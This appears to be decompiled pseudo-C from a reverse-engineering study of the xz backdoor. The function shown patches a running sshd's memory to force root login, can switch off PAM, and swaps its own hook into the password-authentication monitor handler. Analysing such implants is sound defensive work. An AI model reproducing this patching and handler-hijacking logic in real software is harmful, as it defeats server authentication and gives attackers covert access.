// /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_variables.c
// Function: sshd_patch_variables @ 0x107D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_patch_variables(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, int monitor_reqtype, global_context_t * global_ctx)
/*
 * AutoDoc: Tweaks sshd’s in-memory configuration—optionally forcing PermitRootLogin, disabling PAM, and swapping in the authpassword hook—so the implant’s monitor stubs function regardless of the original sshd settings.
 */

#include "xzre_types.h"


BOOL sshd_patch_variables
               (BOOL skip_root_patch,BOOL disable_pam,BOOL replace_monitor_reqtype,
               int monitor_reqtype,global_context_t *global_ctx)

{
  int iVar1;
  uint *puVar2;
  sshd_ctx_t *sshd_ctx;
  sshd_ctx_t *sshd_ctx_1;
  int *use_pam;
  
  if ((((global_ctx == (global_context_t *)0x0) ||
       (sshd_ctx = global_ctx->sshd_ctx, sshd_ctx == (sshd_ctx_t *)0x0)) ||
      (sshd_ctx_1 = (sshd_ctx_t *)sshd_ctx->mm_answer_authpassword_hook,
      sshd_ctx_1 == (sshd_ctx_t *)0x0)) || (sshd_ctx->have_mm_answer_authpassword == 0)) {
    return 0;
  }
  if (skip_root_patch == 0) {
    use_pam = sshd_ctx->permit_root_login_ptr;
    if (use_pam == (int *)0x0) {
      return 0;
    }
    iVar1 = *use_pam;
    if (iVar1 < 3) {
      if (iVar1 < 0) {
        return 0;
      }
      *use_pam = 3;
    }
    else if (iVar1 != 3) {
      return 0;
    }
  }
  if (disable_pam != 0) {
    puVar2 = (uint *)sshd_ctx->use_pam_ptr;
    if (puVar2 == (uint *)0x0) {
      return 0;
    }
    if (1 < *puVar2) {
      return 0;
    }
    *puVar2 = 0;
  }
  if (replace_monitor_reqtype == 0) {
    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_ptr + -1) + 1;
  }
  sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
  *sshd_ctx->mm_answer_authpassword_ptr = (sshd_monitor_func_t)sshd_ctx_1;
  return 1;
}

